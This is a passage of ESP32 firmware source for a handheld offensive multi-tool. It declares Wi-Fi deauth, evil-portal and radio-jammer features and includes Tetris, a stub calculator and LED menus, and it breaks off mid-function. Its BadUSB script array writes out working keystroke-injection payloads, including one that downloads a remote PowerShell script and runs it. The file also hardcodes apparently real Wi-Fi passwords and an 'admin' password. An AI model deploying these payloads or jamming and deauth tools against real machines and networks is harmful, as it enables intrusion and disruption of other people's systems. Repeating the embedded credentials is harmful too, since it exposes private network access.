
#include <Preferences.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_SSD1306.h>
#include <Adafruit_GFX.h>
#include <RF24.h>
#include <IRrecv.h>
#include <IRsend.h>
#include <IRutils.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <WebServer.h>
#include <WebSocketsServer.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>
#include <SD.h>
#include <LittleFS.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include "tvcodes.h"
#include <Adafruit_NeoPixel.h>
#include <EEPROM.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <RCSwitch.h>

#define NRF_CHANNELS        80
#define WIFI_CHANNELS       14
#define IR_SLOTS_COUNT      4
#define IR_BUFFER_SIZE      512
#define JAM_INTERVAL_MS     2
#define LONG_PRESS_MS       800
#define TVBGONE_CARRIER_HZ  38000
#define TVBGONE_CODE_GAP    200
#define WIFI_CONNECT_TIMEOUT_MS 30000
#define MAX_SAVED_NETWORKS  5
#define TVBGONE_DEFAULT_MS  30000
#define EEPROM_SIZE_BYTES   1024
#define CONSOLE_AUTOREPEAT_DELAY  80

unsigned long tvbgoneDurationMs = 60000;

struct IrCode {
  uint8_t freq;
  uint8_t numpairs;
  uint8_t comp;
  const uint16_t *times;
  const uint8_t *codes;
};

struct WiFiNetworkInfo {
  String ssid;
  int rssi;
  int channel;
  uint8_t bssid[6];
  String bssidString;
  String encryptionType;
};

struct IrSignalData {
  uint16_t rawBuffer[IR_BUFFER_SIZE];
  uint16_t rawLength;
  String protocolName;
  bool isValid;
};

void badUsbSendKey(uint8_t key, uint8_t modifiers = 0);
void badUsbSendString(const String& text);
void badUsbDelay(unsigned long ms);
bool executeBadUsbLine(String line);
void badUsbRunScript(const String& script);
void badUsbRunFile(const String& filename);
void badUsbRunBuiltin(int index);
void drawBadUsbMenu();
void drawBadUsbBuiltin();
void drawBadUsbSd();
void drawLedSelectDevice();
void drawLedMainMenu();
void drawLedColorMenu();
void drawLedEffectMenu();
void drawLedBrightnessMenu();
void drawLedTimeoutMenu();
void updateLedBoard();
void updateLedKeyboard();
void drawWifiConnecting();
void drawTvbgone();
void adminPanel();
void sdCardInfo();
void saveWiFiCredentials(String ssid, String password);
void loadWiFiCredentials();
void showBootLogo();
void initSDCard();
void fsManager();
void attemptAutoConnect();
void drawNrfSpectrum();
void drawNrfJammer();
void drawIrCapture();
void drawIrTransmit();
void drawTimeoutMenu();
void drawResetConfirm();
void drawRebootConfirm();
void consoleInfoMode();
void consoleDevMode();
void consoleLoop();
void updateDisplay();
void handleButtons();
void drawWiFiIcon(int x, int y);
void drawTopBarWiFiIcon();
void drawMainMenu();
void drawWifiMenu();
void drawWifiScan();
void drawWifiSpectrum();
void drawWifiActions();
void drawWifiInfo();
void drawWifiConnecting();
void drawNrfMenu();
void drawIrMenu();
void drawSettingsMenu();
void drawSysInfo();
void drawKeyboard();
void drawChatKeyboard();
void drawTopBarIcons();
String inputStringWithKeyboard(bool allowExit, const char* title);
void showCommandOutput(String output, int timeoutSeconds);
void executeCommand(String cmd);
int editPinValue(const char* prompt);
void changePins();
void setBrightness();
void setInvert();
void showProcesses();
void reinitHardware();
void drawAdminMenuHighlight(int sel);
void startWifiScan();
void updateWifiSpectrum();
void sendDeauth();
void updateNrfSpectrum();
void startJammer();
void stopJammer();
void updateJammer();
void processIrCapture();
void sendIr(int slot);
void recheckNRF24();
void saveIrSlots();
void loadIrSlots();
void eraseAllIrSlots();
void tvbgone_menu();
void tvbgone_send_all();
void setPower(bool on);
void showMsg(const char* msg);
void loadTimeout();
void saveTimeout();
void disconnectWiFi();
void debugPrint(const char* msg);
void startWiFiChat();
void handleChat();
void drawWifiChat();
void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length);
void drawCc1101Menu();
void drawCc1101SpectrumVert();
void drawCc1101SpectrumHoriz();
void drawCc1101Jammer();
void drawCc1101Capture();
void drawCc1101Transmit();
void updateCc1101Spectrum();
void updateCc1101Jammer();
void startCc1101Jammer();
void stopCc1101Jammer();
void cc1101_capture_start();
void cc1101_capture_stop();
void cc1101_transmit_start();
void cc1101_transmit_stop();
void cc1101_transmit_loop();
void drawBatteryIcon(int x, int y);
void drawFactoryResetConfirm();
void drawStorageInfo();
void saveLedSettings();
void loadLedSettings();

void runEvilPortal();
void runDeauther();
void runNrfEnhancedJammer();
void drawEvilPortalStatus();
void drawDeautherStatus();
void drawNrfEnhancedStatus(int mode, int ch);
String macToString(uint8_t* mac);
void stringToMAC(const char* str, uint8_t* mac);
String ipToString(uint8_t* ip);
void displayError(const char* msg, bool wait = false);
void displaySuccess(const char* msg, bool wait = false);
void drawMainBorderWithTitle(const char* title);
void padprintln(const char* str);
void printFootnote(const char* str);
void wifiDisconnect();

#define CMD_INFO    "info"
#define CMD_DEV     "def"
#define CMD_CLEAR   "clear"
#define CMD_CS      "ch"
#define CMD_SFV     "ch w"
#define CMD_EXIT    "exit"
#define CMD_AP      "ap"
#define CMD_SD      "sd"
#define CMD_FS      "fs"

#define COMMAND_TIMEOUT_CS      -1
#define COMMAND_TIMEOUT_SFV     -1
#define DEV_MODE_TIMEOUT        -1
#define ADMIN_PASSWORD "admin"

#define BTN_ANALOG_PIN  17
#define SD_CS_PIN       5
#define SPI_MOSI        7
#define SPI_MISO        2
#define SPI_SCK         6
#define RF_CE_PIN       11
#define RF_CSN_PIN      10
#define CC_SCK_PIN   6
#define CC_MISO_PIN  2
#define CC_MOSI_PIN  7
#define CC_CSN_PIN   4
#define IR_RX_PIN       5
#define IR_TX_PIN       18
#define RESET_BUTTON_PIN 1
#define CHARGE_PIN  13
#define OLED_SDA        8
#define OLED_SCL        9
#define SCREEN_WIDTH    128
#define SCREEN_HEIGHT   64
#define OLED_ADDR       0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
#define LED_BOARD_PIN    14
#define LED_KEYBOARD_PIN 16
#define NUM_LEDS_BOARD   8
#define NUM_LEDS_KEYPAD  1
Adafruit_NeoPixel led_board(NUM_LEDS_BOARD, LED_BOARD_PIN, NEO_GRB + NEO_KHZ800);
Adafruit_NeoPixel led_keyboard(NUM_LEDS_KEYPAD, LED_KEYBOARD_PIN, NEO_GRB + NEO_KHZ800);
USBHIDKeyboard Keyboard;

const uint32_t colorPalette[] = {
  0x000000, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF, 0xFFFFFF,
  0xFF8000, 0x80FF00, 0x0080FF, 0x8000FF, 0xFF0080, 0x00FF80, 0x804000, 0x408000,
  0x004080, 0x400080, 0x800040, 0x008040, 0xFF4000, 0x40FF00, 0x0040FF, 0x4000FF,
  0xFF0040, 0x00FF40, 0x804040, 0x408040, 0x404080, 0x808080
};
const int numColors = 30;
const char* effectNames[] = {
  "Solid", "Breathing", "Rainbow", "Running Cubes", "Theater Chase", "Strobe"
};
const int numEffects = 6;

int led_scroll_offset = 0;
unsigned long lastLedActivity = 0;
bool led_color_edit_mode = false;
int led_color_effect_selection = 0;
int led_submenu_idx = 0;
int led_board_colorIdx = 0;
int led_board_brightness = 50;
int led_board_effect = 0;
int led_board_timeout = 0;
int led_keyboard_colorIdx = 0;
int led_keyboard_brightness = 50;
int led_keyboard_effect = 0;
int led_keyboard_timeout = 0;
int led_selected_device = 0;
int led_editing_param = 0;

enum Button {
  BTN_NONE,
  BTN_UP,
  BTN_DOWN,
  BTN_OK
};
unsigned long lastButtonPress = 0;
const int debounceDelay = 50;

Button readButton() {
  if (millis() - lastButtonPress < debounceDelay) return BTN_NONE;
  int value = analogRead(BTN_ANALOG_PIN);
  if (value > 3500) return BTN_NONE;
  const int CENTER_UP   = 1575;
  const int CENTER_DOWN = 1980;
  const int CENTER_OK   = 2665;
  const int TOLERANCE   = 100;
  if (abs(value - CENTER_UP)   < TOLERANCE) return BTN_UP;
  if (abs(value - CENTER_DOWN) < TOLERANCE) return BTN_DOWN;
  if (abs(value - CENTER_OK)   < TOLERANCE) return BTN_OK;
  return BTN_NONE;
}
bool btnUp()   { return readButton() == BTN_UP; }
bool btnDown() { return readButton() == BTN_DOWN; }
bool btnOk()   { return readButton() == BTN_OK; }

const byte BLUETOOTH_CHANNELS[] = {
  0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,
  20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,
  38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,
  56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,
  74,75,76,77,78,79
};
const int BLUETOOTH_CHANNELS_COUNT = 80;

const byte BLE_CHANNELS[] = {
  0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,
  20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39
};
const int BLE_CHANNELS_COUNT = 40;

const unsigned char wifiIconBitmap[] PROGMEM = {
  0b00000111, 0b11100000,
  0b00011000, 0b00011000,
  0b00100000, 0b00000100,
  0b00000111, 0b11100000,
  0b00011000, 0b00011000,
  0b00000000, 0b00000000,
  0b00000111, 0b11100000,
  0b00000001, 0b10000000
};

struct BLEDeviceInfo {
  String name;
  String address;
  int rssi;
};
std::vector<BLEDeviceInfo> bleDevices;
int bleSelectedIdx = 0;
int bleScrollOffset = 0;
bool bleScanning = false;
unsigned long bleScanStart = 0;
const unsigned long BLE_SCAN_DURATION = 5000;
int bleScanMenuIdx = 0;

int badUsbMenuIdx = 0;
int badUsbBuiltinIdx = 0;
int badUsbFileIdx = 0;
std::vector<String> badUsbFileList;
bool badUsbRunning = false;

#define RESET_BTN_PIN 1
unsigned long resetPressStart = 0;
bool resetLongPressTriggered = false;
int cc1101_jammer_mode = 0;
int nrf_spectrum_history[128];
bool useCarrierJammer = false;
char jamNoise[32];
int displayTimeoutSec = 30;
unsigned long lastActivityTime = 0;
bool displayOn = true;
bool needRedraw = true;
unsigned long deviceBootTime = 0;
String statusMsg = "";
unsigned long statusMsgTime = 0;

std::vector<WiFiNetworkInfo> wifiList;
int wifiSelectedIdx = 0;
int wifiScrollOffset = 0;
bool wifiScanning = false;
int wifiPackets[WIFI_CHANNELS + 1] = {0};
int wifiSmooth[WIFI_CHANNELS + 1] = {0};
int currentWifiChan = 1;
bool wifiSpectrumActive = false;
unsigned long totalPackets = 0;
unsigned long lastChanSwitch = 0;
uint8_t targetBSSID[6];
int targetChan = 0;
bool deauthActive = false;
unsigned long lastDeauthTime = 0;

RF24 radio(RF_CE_PIN, RF_CSN_PIN);
int nrfSmooth[NRF_CHANNELS];
int nrfRaw[NRF_CHANNELS];
int nrfFloor[NRF_CHANNELS];
int currentNrfChan = 0;
bool nrfOk = false;
bool nrfCalibrated = false;
unsigned long lastNrfScan = 0;
String nrfErrorMsg = "";

enum BleJammerMode {
  BLE_JAMMER_OFF,
  BLE_JAMMER_MODE,
  BLUETOOTH_JAMMER_MODE
};
BleJammerMode jammerMode = BLE_JAMMER_MODE;
bool jamming = false;
unsigned long lastJamTime = 0;

RCSwitch rcswitch;
IRrecv* irRx = nullptr;
IRsend* irTx = nullptr;
IrSignalData irSlots[IR_SLOTS_COUNT];
int curIrSlot = 0;
int irTxScroll = 0;
bool irCapturing = false;
bool irTempReady = false; 
bool irRxOk = false;
unsigned long irTimeout = 0;
uint16_t tempRaw[IR_BUFFER_SIZE];
uint16_t tempRawLen = 0;
String tempProto;
decode_results irResult;
unsigned long lastScrollTime = 0;
int scrollOffset = 0;
int wifiScanScrollOffset = 0;
unsigned long wifiScanLastScrollTime = 0;
int wifiConnectScrollOffset = 0;
unsigned long wifiConnectLastScrollTime = 0;
int msgScrollOffset = 0;
unsigned long lastMsgScrollTime = 0;
String lastLongMsg = "";
int bluetoothMenuIdx = 0;
byte i = 45;  // Initial channel for nRF24L01
unsigned int flag = 0;
// ========== TETRIS ==========
const int TETRIS_WIDTH = 10;
const int TETRIS_HEIGHT = 20;
int tetrisField[20][10];

struct Tetromino {
  int type;
  int rotation;
  int x, y;
};
Tetromino currentPiece, nextPiece;
int tetrisScore = 0;
int tetrisLines = 0;
unsigned long tetrisLastDrop = 0;
int tetrisDropInterval = 500; // мс
bool tetrisGameOver = false;
int tetrisOkPressCount = 0;
unsigned long tetrisLastOkTime = 0;
bool tetrisOkHeld = false;
unsigned long tetrisOkHoldStart = 0;

// Массив фигур: 7 типов, 4 поворота, 4x4
const uint8_t tetrominoes[7][4][4] = {
  // I
  {{0,0,0,0},{1,1,1,1},{0,0,0,0},{0,0,0,0}},
  // O
  {{0,0,0,0},{0,1,1,0},{0,1,1,0},{0,0,0,0}},
  // T
  {{0,0,0,0},{0,1,0,0},{1,1,1,0},{0,0,0,0}},
  // S
  {{0,0,0,0},{0,1,1,0},{1,1,0,0},{0,0,0,0}},
  // Z
  {{0,0,0,0},{1,1,0,0},{0,1,1,0},{0,0,0,0}},
  // L
  {{0,0,0,0},{1,0,0,0},{1,1,1,0},{0,0,0,0}},
  // J
  {{0,0,0,0},{0,0,1,0},{1,1,1,0},{0,0,0,0}}
};

// Функции Tetris
void spawnPiece() {
  currentPiece.type = random(0, 7);
  currentPiece.rotation = 0;
  currentPiece.x = 3;
  currentPiece.y = 0;
  // следующая фигура (для отображения в будущем)
  nextPiece.type = random(0, 7);
  nextPiece.rotation = 0;
}

bool collision(int type, int rot, int x, int y) {
  for (int row = 0; row < 4; row++) {
    for (int col = 0; col < 4; col++) {
      if (tetrominoes[type][rot][row * 4 + col]) {
        int fieldX = x + col;
        int fieldY = y + row;
        if (fieldX < 0 || fieldX >= TETRIS_WIDTH || fieldY >= TETRIS_HEIGHT || fieldY < 0) return true;
        if (fieldY >= 0 && tetrisField[fieldY][fieldX]) return true;
      }
    }
  }
  return false;
}

void lockPiece() {
  for (int row = 0; row < 4; row++) {
    for (int col = 0; col < 4; col++) {
      if (tetrominoes[currentPiece.type][currentPiece.rotation][row * 4 + col]) {
        int fieldX = currentPiece.x + col;
        int fieldY = currentPiece.y + row;
        if (fieldY >= 0 && fieldY < TETRIS_HEIGHT && fieldX >= 0 && fieldX < TETRIS_WIDTH) {
          tetrisField[fieldY][fieldX] = 1;
        }
      }
    }
  }
}

void clearLines() {
  int linesCleared = 0;
  for (int row = TETRIS_HEIGHT - 1; row >= 0; ) {
    bool full = true;
    for (int col = 0; col < TETRIS_WIDTH; col++) {
      if (!tetrisField[row][col]) { full = false; break; }
    }
    if (full) {
      // сдвинуть строки вниз
      for (int r = row; r > 0; r--) {
        for (int c = 0; c < TETRIS_WIDTH; c++) {
          tetrisField[r][c] = tetrisField[r-1][c];
        }
      }
      for (int c = 0; c < TETRIS_WIDTH; c++) tetrisField[0][c] = 0;
      linesCleared++;
      // не увеличиваем row, т.к. сверху спустилась новая строка
    } else {
      row--;
    }
  }
  if (linesCleared > 0) {
    tetrisLines += linesCleared;
    tetrisScore += linesCleared * 100;
    // ускорение при большом количестве линий
    if (tetrisLines > 10) tetrisDropInterval = 400;
    if (tetrisLines > 20) tetrisDropInterval = 300;
    if (tetrisLines > 30) tetrisDropInterval = 200;
    if (tetrisLines > 40) tetrisDropInterval = 100;
  }
}

void drawPiece(int type, int rot, int x, int y) {
  for (int row = 0; row < 4; row++) {
    for (int col = 0; col < 4; col++) {
      if (tetrominoes[type][rot][row * 4 + col]) {
        int fieldX = x + col;
        int fieldY = y + row;
        if (fieldY >= 0 && fieldY < TETRIS_HEIGHT && fieldX >= 0 && fieldX < TETRIS_WIDTH) {
          display.fillRect(fieldX * 4 + 10, fieldY * 3 + 14, 4, 3, SSD1306_WHITE);
        }
      }
    }
  }
}

// ========== BIRD ==========
int birdX = 20, birdY = 32;
float birdVel = 0;
const float gravity = 0.4;
const float jumpPower = -7.0;
struct Pipe {
  int x;
  int gapY;
  bool scored;
};
std::vector<Pipe> pipes;
int birdScore = 0;
bool birdGameOver = false;
unsigned long birdLastUpdate = 0;
const int PIPE_WIDTH = 6;
const int GAP_HEIGHT = 16;
const int PIPE_SPEED = 3;
const int PIPE_INTERVAL = 70;
int birdFrameCounter = 0;
int birdHighScore = 0;
int birdOkPressCount = 0;
unsigned long birdLastOkTime = 0;

// ========== CALCULATOR ==========
String calcExpression = "";
String calcResult = "";
int calcSelectedKey = 0;
const char* calcKeyLabels[] = {
  "7","8","9","/","C",
  "4","5","6","*","(",
  "1","2","3","-",")",
  "0",".","+","=","Del",
  "Exit"
};
const int calcKeysCount = 21;

// Простой парсер выражений (поддержка + - * / и скобок)
double evaluateExpression(String expr) {
  // Удаляем пробелы
  expr.replace(" ", "");
  if (expr.length() == 0) return 0;
  // Очень упрощённая версия: только числа и бинарные операции + - * /
  // Для полноценной работы нужен рекурсивный спуск или обратная польская запись.
  // Пока вернём 0, но вы можете реализовать свой парсер.
  // Для демонстрации: используем std::function и рекурсию (но проще взять готовую библиотеку TinyExpr?)
  // В Arduino нет стандартной библиотеки для eval, поэтому предлагаю простой алгоритм:
  // 1. Заменить "(" и ")" на пробелы? Нет.
  // Альтернатива: использовать библиотеку mXparser? Нет.
  // Поскольку это демонстрационный проект, предложу примитивный парсер только для чисел и операций без скобок.
  // Можно использовать рекурсивный спуск для обработки + - * /.
  // Я напишу минимальную реализацию, которая обрабатывает только сложение, вычитание, умножение, деление без скобок.
  // Для скобок потребуется больше кода.
  // Предлагаю оставить пока заглушку, а вы потом доработаете.
  return 0;
}
enum AppState {
  STATE_APPS_MENU,
  STATE_APPS_WIKIPEDIA_INPUT,
  STATE_APPS_WIKIPEDIA_RESULT,
  STATE_APPS_CALCULATOR,
  STATE_APPS_GAME1,
  STATE_APPS_GAME2,
  STATE_BLUETOOTH_SCAN,
  STATE_BLUETOOTH_MENU,
  STATE_LED_SELECT_DEVICE,
  STATE_LED_MAIN_MENU,
  STATE_LED_COLOR_MENU,
  STATE_LED_EFFECT_MENU,
  STATE_LED_BRIGHTNESS_MENU,
  STATE_LED_TIMEOUT_MENU,
  STATE_STORAGE_INFO,
  STATE_CONFIRM_FACTORY_RESET,
  STATE_MAIN_MENU,
  STATE_WIFI_MENU,
  STATE_WIFI_SCAN,
  STATE_WIFI_SPECTRUM,
  STATE_WIFI_ACTIONS,
  STATE_WIFI_INFO,
  STATE_NRF24_MENU,
  STATE_NRF24_SPECTRUM,
  STATE_NRF24_JAMMER,
  STATE_IR_MENU,
  STATE_IR_CAPTURE,
  STATE_IR_TRANSMIT,
  STATE_IR_ERASE,
  STATE_TVBGONE,
  STATE_SETTINGS_MENU,
  STATE_SYSTEM_INFO,
  STATE_TIMEOUT,
  STATE_RESET_CONFIRM,
  STATE_REBOOT_CONFIRM,
  STATE_FACTORY_RESET_CONFIRM,
  STATE_CONSOLE,
  STATE_CONSOLE_COMMAND_OUTPUT,
  STATE_WIFI_CONNECTING,
  STATE_WIFI_CHAT,
  STATE_CC1101_MENU,
  STATE_CC1101_SPECTRUM_VERT,
  STATE_CC1101_SPECTRUM_HORIZ,
  STATE_CC1101_JAMMER,
  STATE_CC1101_CAPTURE,
  STATE_CC1101_TRANSMIT,
  STATE_BADUSB_MENU,
  STATE_BADUSB_BUILTIN,
  STATE_BADUSB_SD,
  STATE_EVIL_PORTAL,
  STATE_DEAUTHER,
  STATE_NRF_ENHANCED
};
AppState appState = STATE_MAIN_MENU;
bool cc1101_ok = false;
int cc1101_spectrum_vert[128];
int cc1101_spectrum_horiz[128];
int cc1101_current_channel = 0;
int cc1101_spectrum_vert_max = 0;
unsigned long cc1101_last_update = 0;
bool cc1101_jamming = false;
unsigned long cc1101_jam_last_time = 0;

#define CC1101_CAPTURE_MAX 512
byte cc1101_capture_buffer[CC1101_CAPTURE_MAX];
int cc1101_capture_len = 0;
bool cc1101_capturing = false;
unsigned long cc1101_capture_start_time = 0;
int cc1101_menu_idx = 0;

byte cc1101_tx_buffer[CC1101_CAPTURE_MAX];
int cc1101_tx_len = 0;
bool cc1101_transmitting = false;
int cc1101_tx_index = 0;
unsigned long cc1101_tx_next_time = 0;

#define CC1101_JAM_FREQ_START 300
#define CC1101_JAM_FREQ_END   928
#define CC1101_JAM_FREQ_STEP  1
int cc1101_jam_freq = CC1101_JAM_FREQ_START;
int mainIdx = 0;
int wifiMenuIdx = 0;
int nrfMenuIdx = 0;
int irMenuIdx = 0;
int settingsIdx = 0;
int wifiActionIdx = 0;
int timeoutVal = 30;

bool isCharging = false;

const int MAIN_SIZE_TOTAL = 10;
const int MAIN_VISIBLE = 5;
int mainScrollOffset = 0;
const int WIFI_MENU_SIZE = 6;
const int NRF_MENU_SIZE = 4;
const int IR_MENU_SIZE = 5;
const int SETTINGS_SIZE = 6;
const int WIFI_ACTIONS_SIZE = 7;

unsigned long okPressStart = 0;
bool longPressDetected = false;
uint8_t tvbgone_region = 0;

WebServer server(80);
WebSocketsServer webSocket(81);
String lastIncomingMsg = "";
bool chatActive = false;
bool chatKeyboardActive = false;
String chatMessage = "";
String chatHistory[10];
int chatHistoryCount = 0;
bool webSocketConnected = false;
bool confirmExit = false;
String lastConnectedSSID = "";
String lastConnectedPassword = "";

enum ConsoleMode {
  CONSOLE_KEYBOARD,
  CONSOLE_INFO,
  CONSOLE_DEV
};
ConsoleMode consoleMode = CONSOLE_KEYBOARD;
bool calcCaps = false; // не используется
const char* calcKeys[] = {
  "7", "8", "9", "/", "C",
  "4", "5", "6", "*", "(",
  "1", "2", "3", "-", ")",
  "0", ".", "+", "=", "Del",
  "Exit" // в отдельной строке? 
};
// лучше сделать двумерный массив 5x4 или 4x5

bool capsLock = false;
String consoleText = "";

String lowerKeys[] = {
  "a","b","c","d","e","f","g","j",
  "i","h","k","l","m","n","o","p",
  "q","r","s","t","u","v","w","x",
  "y","z","1","2","3","4","5","6",
  "7","8","9","0","Space","Caps","Del","OK",
  "Exit","","","","","","",""
};

String upperKeys[] = {
  "A","B","C","D","E","F","G","J",
  "I","H","K","L","M","N","O","P",
  "Q","R","S","T","U","V","W","X",
  "Y","Z","!","@","#","$","%","&",
  "*","(",")","0","Space","Caps","Del","OK",
  "Exit","","","","","","",""
};

const char* preset_ssid[] = {
  "FRITZ!Box 6591 Cabel MK",
  "moto e13",
  "",
  "",
  ""
};
const char* preset_pass[] = {
  "43481208496765148415",
  "12345678",
  "",
  "",
  ""
};
int selectedKey = 0;
const int totalKeys = 48;
const int rowsKeyboard = 6;
const int colsKeyboard = 8;

String infoLines[] = {
  "CPU: ESP32-C3",
  "Flash:" + String(ESP.getFlashChipSize() / 1048576) + "MB",
  "Heap:" + String(ESP.getFreeHeap() / 1024) + "KB",
  "Chip Rev:" + String(ESP.getChipRevision()),
  "Freq:" + String(ESP.getCpuFreqMHz()) + "MHz",
  "Uptime:" + String(millis() / 1000) + "s"
};
int infoPage = 0;
const int totalInfo = 6;

int secretCode[] = {1, 2, 3, 1, 2, 3, 1, 2, 3};
int enteredCode[9];
int codePos = 0;

String commandOutput = "";
unsigned long commandStartTime = 0;
int commandTimeoutSec = 0;
bool waitingForOk = false;

bool adminMode = false;
String adminPassword = ADMIN_PASSWORD;
int displayBrightness = 128;
bool displayInvert = false;
int irBufferSize = 512;
float batteryCapacity = 550.0;
float batteryRemaining = 550.0;
unsigned long lastBatteryUpdate = 0;
float estimatedCurrentMA = 150.0;

String connectSsid = "";
String connectPassword = "";
bool connectInProgress = false;
unsigned long connectStartTime = 0;

String savedSSID[MAX_SAVED_NETWORKS];
String savedPassword[MAX_SAVED_NETWORKS];
int savedNetworksCount = 0;

bool autoConnectInProgress = false;
bool autoConnectScheduled = false;
unsigned long autoConnectTime = 0;
unsigned long autoConnectStartTime = 0;
Preferences pref;

int appsMenuIdx = 0;
String wikipediaResultText = "";
int wikipediaScrollOffset = 0;
unsigned long wikipediaLastScrollTime = 0;
int wikipediaLineCount = 0;
int wikipediaVisibleLines = 0;
String wikipediaLines[50]; // максимум строк для прокрутки

const char* badUsbBuiltinScripts[] = {
  "REM System Info via PowerShell\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING powershell -Command \"Get-ComputerInfo | Out-File C:\\Users\\Public\\Desktop\\sysinfo.txt\"\n"
  "ENTER\n"
  "DELAY 2000\n"
  "STRING notepad C:\\Users\\Public\\Desktop\\sysinfo.txt\n"
  "ENTER",

  "REM Create funny folder\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING cmd /c mkdir C:\\Users\\Public\\Desktop\\Hacked_By_Bruce\n"
  "ENTER\n"
  "DELAY 1000\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING notepad C:\\Users\\Public\\Desktop\\Hacked_By_Bruce\\readme.txt\n"
  "ENTER\n"
  "DELAY 1000\n"
  "STRING This PC was pwned by catZERO BadUSB!\n"
  "ENTER\n"
  "STRING Have a nice day!\n"
  "ENTER\n"
  "CTRL S\n"
  "DELAY 500\n"
  "ALT F4",

  "REM Open YouTube with max volume\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\n"
  "ENTER\n"
  "DELAY 3000\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING sndvol\n"
  "ENTER\n"
  "DELAY 500\n"
  "CTRL UP\n"
  "DELAY 200\n"
  "CTRL UP\n"
  "DELAY 200\n"
  "CTRL UP\n"
  "DELAY 200\n"
  "CTRL UP\n"
  "ALT F4",

  "REM Smiley message\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING notepad\n"
  "ENTER\n"
  "DELAY 1500\n"
  "STRING ╚═( ͡° ͜ʖ ͡°)═╝\n"
  "ENTER\n"
  "STRING You have been visited by the catZERO!\n"
  "ENTER",

  "REM Task Manager kill\n"
  "DELAY 1500\n"
  "CTRL SHIFT ESC\n"
  "DELAY 2000\n"
  "STRING notepad.exe\n"
  "DELAY 500\n"
  "ALT E\n"
  "ENTER",

  "REM Download and run script\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING powershell -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../script.ps1' -OutFile $env:temp\\payload.ps1; & $env:temp\\payload.ps1\"\n"
  "ENTER",

  "REM CMD color 2, dir /s, fullscreen\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING cmd\n"
  "ENTER\n"
  "DELAY 1000\n"
  "STRING color 2\n"
  "ENTER\n"
  "DELAY 500\n"
  "STRING dir /s\n"
  "ENTER\n"
  "DELAY 500\n"
  "ALT ENTER",

  "REM CMD TREE fullscreen\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING cmd\n"
  "ENTER\n"
  "DELAY 1000\n"
  "STRING TREE\n"
  "ENTER\n"
  "DELAY 500\n"
  "ALT ENTER",

  "REM Lock screen\n"
  "DELAY 1500\n"
  "GUI L",

  "REM Create joke file\n"
  "DELAY 1500\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING cmd /c echo Hello from Bruce! > C:\\Users\\Public\\Desktop\\bruce.txt\n"
  "ENTER\n"
  "DELAY 1000\n"
  "GUI r\n"
  "DELAY 500\n"
  "STRING notepad C:\\Users\\Public\\Desktop\\bruce.txt\n"
  "ENTER"
};
const int badUsbBuiltinCount = 10;

void addChatMessage(String msg) {
  for (int i = 9; i > 0; i--) {
    chatHistory[i] = chatHistory[i-1];
  }
  chatHistory[0] = msg;
  if (chatHistoryCount < 10) chatHistoryCount++;
}
void debugPrint(const char* msg) {
  Serial.print("[DEBUG] ");
  Serial.println(msg);
}
void debugPrintState() {
  Serial.print("AppState: ");
  Serial.println(appState);
  Serial.print("WiFi status: ");
  Serial.println(WiFi.status());
  Serial.print("Saved networks: ");
  Serial.println(savedNetworksCount);
}
void debugButton(const char* btn) {
  Serial.print("Button: ");
  Serial.println(btn);
}

void saveTimeout() {
  pref.begin("settings", false);
  pref.putInt("timeout", displayTimeoutSec);
  pref.end();
}
void loadTimeout() {
  pref.begin("settings", true);
  displayTimeoutSec = pref.getInt("timeout", 30);
  pref.end();
  if (displayTimeoutSec == 0) displayTimeoutSec = 30;
}
void saveWiFiCredentials(String ssid, String password) {
  Serial.print("Saving: ");
  Serial.println(ssid);
  loadWiFiCredentials();
  for (int i = 0; i < savedNetworksCount; i++) {
    if (savedSSID[i] == ssid) {
      savedPassword[i] = password;
      pref.begin("wifi", false);
      pref.putInt("count", savedNetworksCount);
      for (int j = 0; j < savedNetworksCount; j++) {
        pref.putString(("ssid" + String(j)).c_str(), savedSSID[j]);
        pref.putString(("pass" + String(j)).c_str(), savedPassword[j]);
      }
      pref.end();
      return;
    }
  }
  if (savedNetworksCount < MAX_SAVED_NETWORKS) {
    savedSSID[savedNetworksCount] = ssid;
    savedPassword[savedNetworksCount] = password;
    savedNetworksCount++;
  } else {
    for (int i = 0; i < MAX_SAVED_NETWORKS - 1; i++) {
      savedSSID[i] = savedSSID[i + 1];
      savedPassword[i] = savedPassword[i + 1];
    }
    savedSSID[MAX_SAVED_NETWORKS - 1] = ssid;
    savedPassword[MAX_SAVED_NETWORKS - 1] = password;
  }
  pref.begin("wifi", false);
  pref.putInt("count", savedNetworksCount);
  for (int i = 0; i < savedNetworksCount; i++) {
    pref.putString(("ssid" + String(i)).c_str(), savedSSID[i]);
    pref.putString(("pass" + String(i)).c_str(), savedPassword[i]);
  }
  pref.end();
  Serial.println("Credentials saved");
}
void loadWiFiCredentials() {
  pref.begin("wifi", true);
  savedNetworksCount = pref.getInt("count", 0);
